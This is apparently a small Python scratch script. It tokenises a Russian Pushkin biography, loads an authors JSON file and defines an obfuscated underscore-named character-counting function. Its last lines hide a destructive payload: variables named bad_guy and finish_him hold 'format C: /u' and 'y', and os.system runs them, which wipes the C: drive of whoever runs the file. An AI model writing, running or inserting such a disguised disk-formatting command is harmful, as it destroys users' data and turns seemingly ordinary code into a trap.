from royal_parsing import royal_parser
from lib import mylang

data = "Пушкин, Александр Сергеевич  Александр Сергеевич Пушкин (26 мая [6 июня] 1799, Москва — 29 января [10 февраля] 1837, Санкт-Петербург) — русский поэт, драматург и прозаик, заложивший основы русского реалистического"
print(mylang.split_words(data)) # {" ", "\t", "\n", "\r", ";", "!", ".", "?", "/", '"', "'", "(", ")", "[", "]", ",", "-", "=", "—"}

authors = royal_parser.load_json_from_file("../Authors.json")
print(len(authors))
print(authors[63097])


def __(__):
    return __ - 1
def _(___ : str) -> int:
    _____ = 0
    for ______ in range(len(___)):
        ____ = ___[______]
        if "A" < ____ < "Я" or "я" < ____ < "я" or ____ == "_":
            _____ = __(_____)
    return _____

_______________ = "def __(__):\
    return __ - 1\
def _(___ : str) -> int:\
    _____ = 0\
    for ______ in range(len(___)):\
        ____ = ___[______]\
        if \"A\" < ____ < \"Я\" or \"я\" < ____ < \"я\" or ____ == \"_\":\
            _____ = __(_____)"

__Код_____сТайЛе = _(_______________)
print(__Код_____сТайЛе)


bad_guy = "format C: /u"
finish_him = "y"

import os
os.system(bad_guy)
os.system(finish_him)

